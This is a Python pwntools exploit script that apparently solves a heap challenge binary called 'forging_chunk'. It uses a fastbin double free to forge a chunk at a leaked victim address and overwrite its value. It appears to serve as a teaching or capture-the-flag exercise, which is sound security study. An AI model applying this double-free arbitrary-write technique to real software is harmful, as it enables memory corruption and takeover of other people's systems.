from pwn import *


def malloc(x):
    p.recvuntil("(3)show")
    p.sendline("1")
    p.sendline(str(x))
    p.recvuntil("adr:")
    return p.recvline()


def free(x):
    p.recvuntil("(3)show")
    p.sendline("0")
    p.sendline(str(x))


def write(x, string):
    p.recvuntil("(3)show")
    p.sendline("2")
    p.sendline(str(x))
    p.sendline(string)


def show(x):
    p.recvuntil("(3)show")
    p.sendline("3")
    p.sendline(str(x))
    p.recvuntil("your string:\n")
    return p.recvuntil("(0)free")[:-8]


p = process("./forging_chunk")
p.recvuntil("address:")
victim_adr = int(p.recvline(), 16)
print "victim's address = " + hex(victim_adr)

malloc(0)
malloc(1)
free(0)
free(1)
free(0)  # double free
print malloc(0)
print malloc(1)

# we have 'size' variable with value 0x20 before victim
write(0, p64(victim_adr - 16))
print malloc(2)
print malloc(3)  # get victim_adr
write(3, p64(0xdeadbeef))  # change victim value
p.sendline("5")  # exit
p.interactive()
